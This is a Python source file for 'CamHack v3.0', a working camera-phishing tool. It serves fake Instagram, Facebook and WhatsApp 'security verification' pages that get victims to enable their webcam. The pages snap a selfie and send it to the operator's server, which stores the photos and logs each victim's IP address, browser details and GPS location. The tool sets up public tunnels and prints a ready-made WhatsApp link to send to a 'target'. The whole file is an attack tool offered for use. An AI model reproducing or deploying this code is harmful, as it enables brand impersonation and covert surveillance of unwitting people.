#!/usr/bin/env python3
"""
██████╗ █████╗ ███╗   ███╗██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔════╝██╔══██╗████╗ ████║██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██║     ███████║██╔████╔██║███████║███████║██║     █████╔╝ 
██║     ██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║     ██╔═██╗ 
╚██████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
CamHack v3.0 - Camera Exploitation & Surveillance Engine
"""

import os
import sys
import time
import json
import base64
import random
import string
import threading
import subprocess
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# Add parent dirs
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))
from core.colors import colors


# ===================== PHISHING TEMPLATES =====================

TEMPLATES = {
    'instagram': {
        'name': 'Instagram Security Check',
        'icon': '📸',
        'html': '''<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram - Security Verification</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,sans-serif; }
body { background:#fafafa; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { background:#fff; border:1px solid #dbdbdb; border-radius:12px; padding:40px; max-width:400px; width:90%; text-align:center; }
.logo { font-size:40px; margin-bottom:20px; }
h2 { color:#262626; margin-bottom:8px; }
p { color:#8e8e8e; font-size:14px; margin-bottom:25px; line-height:1.5; }
.btn-camera { background:#0095f6; color:#fff; border:none; border-radius:8px; padding:12px 30px; font-size:16px; font-weight:600; cursor:pointer; width:100%; }
.btn-camera:hover { background:#1877f2; }
.btn-camera:disabled { background:#b2dffc; cursor:not-allowed; }
.video-container { width:280px; height:210px; background:#000; border-radius:8px; margin:20px auto; overflow:hidden; display:none; }
video { width:100%; height:100%; object-fit:cover; }
.status { margin-top:15px; font-size:13px; color:#8e8e8e; }
.loader { display:none; border:3px solid #f3f3f3; border-top:3px solid #0095f6; border-radius:50%; width:25px; height:25px; animation:spin 1s linear infinite; margin:15px auto; }
@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
</style></head>
<body>
<div class="container">
<div class="logo">📸</div>
<h2>Security Verification Required</h2>
<p>We noticed a login from an unrecognized device. Please verify it's you by taking a quick selfie.</p>
<div class="loader" id="loader"></div>
<button class="btn-camera" id="camBtn" onclick="startCamera()">📷 Take Selfie to Verify</button>
<div class="video-container" id="videoContainer">
<video id="video" autoplay playsinline></video>
</div>
<div class="status" id="status">Your security is our top priority 🔒</div>
<canvas id="canvas" style="display:none;"></canvas>
</div>
<script>
let stream = null;
function startCamera() {
    document.getElementById('camBtn').style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    document.getElementById('status').textContent = 'Accessing camera...';
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
    .then(function(s) {
        stream = s;
        document.getElementById('loader').style.display = 'none';
        document.getElementById('videoContainer').style.display = 'block';
        document.getElementById('video').srcObject = s;
        document.getElementById('status').textContent = '✅ Camera connected. Capturing verification...';
        
        setTimeout(capturePhoto, 2000);
    })
    .catch(function(err) {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('camBtn').style.display = 'block';
        document.getElementById('status').textContent = '❌ Camera access denied: ' + err.message;
    });
}

function capturePhoto() {
    var video = document.getElementById('video');
    var canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    var imageData = canvas.toDataURL('image/jpeg', 0.85);
    
    document.getElementById('status').textContent = '📤 Sending verification...';
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/capture', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if (stream) { stream.getTracks().forEach(t => t.stop()); }
        document.getElementById('videoContainer').style.display = 'none';
        document.getElementById('status').textContent = '✅ Verification successful! Redirecting...';
        document.getElementById('status').style.color = '#00c853';
        setTimeout(function() {
            document.body.innerHTML = '<div class="container"><div style="font-size:60px;margin-bottom:20px;">✅</div><h2>Verified!</h2><p style="color:#8e8e8e;">You will be redirected to Instagram shortly.</p></div>';
        }, 1500);
    };
    xhr.send('image=' + encodeURIComponent(imageData));
}
</script>
</body></html>'''
    },
    
    'facebook': {
        'name': 'Facebook Account Recovery',
        'icon': '👤',
        'html': '''<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - Account Recovery</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:Helvetica,Arial,sans-serif; }
body { background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { background:#fff; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,0.2); padding:40px; max-width:400px; width:90%; text-align:center; }
.logo { color:#1877f2; font-size:48px; font-weight:bold; margin-bottom:20px; }
h2 { color:#1c1e21; font-size:20px; margin-bottom:8px; }
p { color:#606770; font-size:15px; margin-bottom:20px; }
.btn { background:#1877f2; color:#fff; border:none; border-radius:6px; padding:12px 24px; font-size:16px; font-weight:600; cursor:pointer; width:100%; }
.btn:hover { background:#166fe5; }
#videoContainer { width:100%; max-width:320px; margin:15px auto; border-radius:8px; overflow:hidden; display:none; background:#000; }
video { width:100%; display:block; }
.status { font-size:13px; color:#65676b; margin-top:10px; }
.loader { display:inline-block; border:3px solid #e4e6eb; border-top:3px solid #1877f2; border-radius:50%; width:24px; height:24px; animation:spin 0.8s linear infinite; margin:10px; }
@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
</style></head>
<body>
<div class="container">
<div class="logo">f</div>
<h2>Identity Verification</h2>
<p>For your security, please verify your identity by taking a photo.</p>
<button class="btn" id="startBtn" onclick="startVerification()">📸 Start Verification</button>
<div class="loader" id="loader" style="display:none;"></div>
<div id="videoContainer"><video id="video" autoplay playsinline></video></div>
<p class="status" id="status">🔒 End-to-end encrypted</p>
<canvas id="canvas" style="display:none;"></canvas>
</div>
<script>
let mediaStream = null;
function startVerification() {
    document.getElementById('startBtn').style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    document.getElementById('status').textContent = 'Accessing camera...';
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
    .then(function(stream) {
        mediaStream = stream;
        document.getElementById('loader').style.display = 'none';
        document.getElementById('videoContainer').style.display = 'block';
        document.getElementById('video').srcObject = stream;
        document.getElementById('status').textContent = '✅ Camera ready. Capturing...';
        setTimeout(capture, 2500);
    })
    .catch(function(err) {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('startBtn').style.display = 'block';
        document.getElementById('status').textContent = '❌ Error: ' + err.message;
    });
}
function capture() {
    var v = document.getElementById('video');
    var c = document.getElementById('canvas');
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    var img = c.toDataURL('image/jpeg', 0.85);
    document.getElementById('status').textContent = '📤 Processing...';
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/capture', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if(mediaStream) mediaStream.getTracks().forEach(t=>t.stop());
        document.getElementById('videoContainer').style.display = 'none';
        document.getElementById('status').textContent = '✅ Verified! Redirecting...';
        document.getElementById('status').style.color = '#00a400';
        setTimeout(function(){ document.body.innerHTML = '<div class="container"><div style="font-size:60px;">✅</div><h2>Verified</h2><p>Redirecting to Facebook...</p></div>'; }, 2000);
    };
    xhr.send('image=' + encodeURIComponent(img));
}
</script>
</body></html>'''
    },
    
    'whatsapp': {
        'name': 'WhatsApp Web Verification',
        'icon': '💬',
        'html': '''<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WhatsApp Web</title>
<style>
* { margin:0; padding:0; font-family:'Segoe UI',sans-serif; }
body { background:#ece5dd; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { background:#fff; border-radius:8px; max-width:400px; width:90%; padding:30px; text-align:center; box-shadow:0 1px 3px rgba(0,0,0,0.08); }
.whatsapp-icon { width:80px; height:80px; background:#25d366; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 20px; font-size:40px; color:#fff; }
h2 { color:#1c1e21; margin-bottom:5px; }
.sub { color:#667781; font-size:14px; margin-bottom:25px; }
.btn { background:#25d366; color:#fff; border:none; border-radius:24px; padding:12px 30px; font-size:16px; cursor:pointer; width:100%; font-weight:700; }
.btn:hover { background:#1da851; }
#preview { width:100%; max-width:300px; margin:15px auto; border-radius:8px; overflow:hidden; display:none; }
video { width:100%; display:block; }
.status { font-size:12px; color:#667781; margin-top:12px; }
</style></head>
<body>
<div class="container">
<div class="whatsapp-icon">💬</div>
<h2>WhatsApp Web</h2>
<p class="sub">Scan this QR code or verify your identity to continue</p>
<button class="btn" id="scanBtn" onclick="scanQR()">📷 Scan QR Code</button>
<div id="preview"><video id="video" autoplay playsinline></video></div>
<p class="status" id="status">Keep your face visible for verification</p>
<canvas id="canvas" style="display:none;"></canvas>
</div>
<script>
let stream = null;
function scanQR() {
    document.getElementById('scanBtn').style.display = 'none';
    document.getElementById('status').textContent = 'Accessing camera...';
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
    .then(function(s) {
        stream = s;
        document.getElementById('preview').style.display = 'block';
        document.getElementById('video').srcObject = s;
        document.getElementById('status').textContent = '✅ Scanning QR code...';
        setTimeout(cap, 3000);
    })
    .catch(function(e) {
        document.getElementById('scanBtn').style.display = 'block';
        document.getElementById('status').textContent = '❌ Camera blocked';
    });
}
function cap() {
    var v = document.getElementById('video');
    var c = document.getElementById('canvas');
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    var img = c.toDataURL('image/jpeg', 0.9);
    document.getElementById('status').textContent = '📤 Authenticating...';
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/capture', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if(stream) stream.getTracks().forEach(t=>t.stop());
        document.getElementById('preview').style.display = 'none';
        document.getElementById('status').textContent = '✅ WhatsApp Web connected!';
        document.getElementById('status').style.color = '#25d366';
    };
    xhr.send('image=' + encodeURIComponent(img));
}
</script>
</body></html>'''
    },
}


class CamHackHandler(BaseHTTPRequestHandler):
    """HTTP Handler for camera phishing"""
    
    photos_dir = 'captured_photos'
    target_info = {}
    capture_count = 0
    
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/':
            # Show selected template
            template = self.server.template_name if hasattr(self.server, 'template_name') else 'instagram'
            html = TEMPLATES.get(template, TEMPLATES['instagram'])['html']
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Server', 'Cloudflare-nginx')
            self.end_headers()
            self.wfile.write(html.encode())
            
        elif parsed.path == '/captured':
            # Show captured photos
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            
            html = '<html><head><title>Captured Photos</title><meta name="viewport" content="width=device-width,initial-scale=1">'
            html += '<style>body{font-family:sans-serif;background:#1a1a2e;color:#fff;padding:20px;}'
            html += 'h1{color:#e94560;}img{max-width:300px;border-radius:8px;margin:10px;border:2px solid #e94560;}</style></head><body>'
            html += f'<h1>📸 Captured Photos: {self.capture_count}</h1>'
            
            if os.path.exists(self.photos_dir):
                photos = sorted(os.listdir(self.photos_dir), reverse=True)
                for photo in photos[:50]:
                    if photo.endswith('.jpg'):
                        html += f'<img src="/photos/{photo}" /><br/>'
            
            if not os.path.exists(self.photos_dir) or len(os.listdir(self.photos_dir)) == 0:
                html += '<p>No photos captured yet. Share your phishing link!</p>'
            
            html += '</body></html>'
            self.wfile.write(html.encode())
            
        elif parsed.path.startswith('/photos/'):
            photo_path = parsed.path[8:]
            full_path = os.path.join(self.photos_dir, photo_path)
            if os.path.exists(full_path):
                self.send_response(200)
                self.send_header('Content-Type', 'image/jpeg')
                self.end_headers()
                with open(full_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                
        elif parsed.path == '/info':
            # Show target info
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(self.target_info, indent=2).encode())
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode()
        
        if self.path == '/capture':
            # Parse the image data
            params = parse_qs(body)
            image_data = params.get('image', [''])[0]
            
            if image_data and ',' in image_data:
                # Extract base64
                base64_str = image_data.split(',')[1]
                image_bytes = base64.b64decode(base64_str)
                
                # Save photo
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
                photo_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
                filename = f"cam_{timestamp}_{photo_id}.jpg"
                
                os.makedirs(self.photos_dir, exist_ok=True)
                filepath = os.path.join(self.photos_dir, filename)
                
                with open(filepath, 'wb') as f:
                    f.write(image_bytes)
                
                self.capture_count += 1
                
                # Get client info
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                self.target_info = {
                    'ip': client_ip,
                    'user_agent': user_agent,
                    'timestamp': timestamp,
                    'photo': filename,
                    'count': self.capture_count,
                }
                
                print(f"\n{colors.GREEN}═══════════════════════════════════════{colors.RESET}")
                print(f"{colors.RED}[🔥] CAMERA PHOTO CAPTURED!{colors.RESET}")
                print(f"{colors.GREEN}═══════════════════════════════════════{colors.RESET}")
                print(f"{colors.CYAN}  📸 Photo:{colors.RESET} {colors.YELLOW}{filename}{colors.RESET}")
                print(f"{colors.CYAN}  🌐 IP:{colors.RESET} {colors.YELLOW}{client_ip}{colors.RESET}")
                print(f"{colors.CYAN}  🕒 Time:{colors.RESET} {colors.YELLOW}{timestamp}{colors.RESET}")
                print(f"{colors.CYAN}  📱 UA:{colors.RESET} {colors.DIM}{user_agent[:80]}{colors.RESET}")
                print(f"{colors.GREEN}═══════════════════════════════════════{colors.RESET}\n")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
            
        elif self.path == '/location':
            params = parse_qs(body)
            self.target_info['latitude'] = params.get('lat', [''])[0]
            self.target_info['longitude'] = params.get('lon', [''])[0]
            self.target_info['accuracy'] = params.get('acc', [''])[0]
            
            print(f"\n{colors.GREEN}[📍] LOCATION UPDATED:{colors.RESET}")
            print(f"  ├─ {colors.CYAN}Lat:{colors.RESET} {self.target_info['latitude']}")
            print(f"  ├─ {colors.CYAN}Lon:{colors.RESET} {self.target_info['longitude']}")
            print(f"  └─ {colors.CYAN}Acc:{colors.RESET} {self.target_info['accuracy']}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
    
    def log_message(self, format, *args):
        pass  # Suppress HTTP server logs


class CamHackEngine:
    """Camera Hacking Engine"""
    
    def __init__(self):
        self.server = None
        self.thread = None
        self.port = 8080
        self.template = 'instagram'
        self.use_cloudflare = False
        self.use_ngrok = False
    
    def show_banner(self):
        print(f"""
{colors.RED}╔══════════════════════════════════════════════════╗
║{colors.CYAN}   ██████╗ █████╗ ███╗   ███╗██╗  ██╗ █████╗  ██████╗██╗  ██╗{colors.RED}  ║
║{colors.CYAN}  ██╔════╝██╔══██╗████╗ ████║██║  ██║██╔══██╗██╔════╝██║ ██╔╝{colors.RED}  ║
║{colors.CYAN}  ██║     ███████║██╔████╔██║███████║███████║██║     █████╔╝ {colors.RED}  ║
║{colors.CYAN}  ██║     ██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║     ██╔═██╗ {colors.RED}  ║
║{colors.CYAN}  ╚██████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║  ██║╚██████╗██║  ██╗{colors.RED}  ║
║{colors.CYAN}   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{colors.RED}  ║
║{colors.GREEN}         Camera Exploitation & Surveillance Engine v3.0   {colors.RED}  ║
╚══════════════════════════════════════════════════╝{colors.RESET}
        """)
    
    def select_template(self):
        """Choose phishing template"""
        print(f"\n{colors.CYAN}[+] Select Phishing Template:{colors.RESET}")
        templates = list(TEMPLATES.keys())
        for i, t in enumerate(templates, 1):
            info = TEMPLATES[t]
            print(f"  {colors.YELLOW}[{i}]{colors.RESET} {info['icon']} {info['name']}")
        
        choice = input(f"\n{colors.YELLOW}[?] Choice [1]: {colors.RESET}").strip() or '1'
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(templates):
                self.template = templates[idx]
        except:
            self.template = 'instagram'
        
        print(f"  {colors.GREEN}[+] Selected: {TEMPLATES[self.template]['name']}{colors.RESET}")
    
    def setup_server(self):
        """Start the HTTP server"""
        # Get port
        port_input = input(f"{colors.YELLOW}[?] Port [8080]: {colors.RESET}").strip()
        self.port = int(port_input) if port_input else 8080
        
        # Create handler with photos dir
        handler = CamHackHandler
        handler.photos_dir = os.path.join(os.path.dirname(__file__), '../../output/cam_captures')
        handler.capture_count = 0
        
        # Start server
        self.server = HTTPServer(('0.0.0.0', self.port), handler)
        self.server.template_name = self.template
        
        print(f"\n{colors.GREEN}[+] Phishing server started!{colors.RESET}")
        print(f"  ├─ {colors.CYAN}Local URL:{colors.RESET} http://localhost:{self.port}")
        
        # Show local IP
        try:
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            print(f"  ├─ {colors.CYAN}Local IP:{colors.RESET} http://{local_ip}:{self.port}")
        except:
            pass
        
        # Cloudflared option
        print(f"\n{colors.YELLOW}[?] Use Cloudflared tunnel? (y/N):{colors.RESET}")
        if input().strip().lower() == 'y':
            self.start_cloudflared()
        
        # Ngrok option
        print(f"\n{colors.YELLOW}[?] Use Ngrok tunnel? (y/N):{colors.RESET}")
        if input().strip().lower() == 'y':
            self.start_ngrok()
        
        print(f"\n{colors.GREEN}[+] Send this link to target!{colors.RESET}")
        print(f"{colors.MAGENTA}────────────────────────────────────────{colors.RESET}")
        print(f"{colors.GREEN}  📎 https://wa.me/?text=Check+this+link:+http://YOUR_IP:{self.port}{colors.RESET}")
        print(f"{colors.MAGENTA}────────────────────────────────────────{colors.RESET}")
        print(f"\n{colors.YELLOW}[!] Waiting for target to open link...{colors.RESET}")
        print(f"{colors.YELLOW}[!] Press Ctrl+C to stop server{colors.RESET}")
        print(f"{colors.DIM}[*] View captured photos at: http://localhost:{self.port}/captured{colors.RESET}")
        
        # Start server in thread
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        
        # Keep alive
        try:
            self.thread.join()
        except KeyboardInterrupt:
            print(f"\n{colors.YELLOW}[!] Stopping server...{colors.RESET}")
            self.server.shutdown()
    
    def start_cloudflared(self):
        """Start Cloudflared tunnel"""
        try:
            # Check if cloudflared is installed
            result = subprocess.run(['which', 'cloudflared'], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{colors.YELLOW}[!] Installing cloudflared...{colors.RESET}")
                # Download cloudflared
                subprocess.run(['wget', '-q', 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', '-O', '/tmp/cloudflared'], capture_output=True)
                subprocess.run(['chmod', '+x', '/tmp/cloudflared'], capture_output=True)
                subprocess.run(['mv', '/tmp/cloudflared', '/usr/local/bin/cloudflared'], capture_output=True)
            
            # Start tunnel in background
            cmd = f"cloudflared tunnel --url http://localhost:{self.port} --no-autoupdate --loglevel error"
            subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"  └─ {colors.GREEN}[+] Cloudflared tunnel starting...{colors.RESET}")
            time.sleep(3)
            print(f"  └─ {colors.YELLOW}[!] Check cloudflared output for public URL{colors.RESET}")
        except Exception as e:
            print(f"  └─ {colors.RED}[!] Cloudflared error: {str(e)}{colors.RESET}")
    
    def start_ngrok(self):
        """Start Ngrok tunnel"""
        try:
            result = subprocess.run(['which', 'ngrok'], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{colors.YELLOW}[!] ngrok not found. Install from https://ngrok.com{colors.RESET}")
                return
            
            # Start ngrok in background
            cmd = f"ngrok http {self.port} --log=stdout"
            subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            
            # Get ngrok URL
            try:
                import requests
                resp = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                data = resp.json()
                for tunnel in data.get('tunnels', []):
                    if tunnel.get('public_url'):
                        print(f"  └─ {colors.GREEN}[+] Ngrok URL:{colors.RESET} {colors.YELLOW}{tunnel['public_url']}{colors.RESET}")
            except:
                print(f"  └─ {colors.YELLOW}[!] Check ngrok dashboard for URL{colors.RESET}")
        except Exception as e:
            print(f"  └─ {colors.RED}[!] Ngrok error: {str(e)}{colors.RESET}")
    
    def run(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self.show_banner()
        self.select_template()
        self.setup_server()
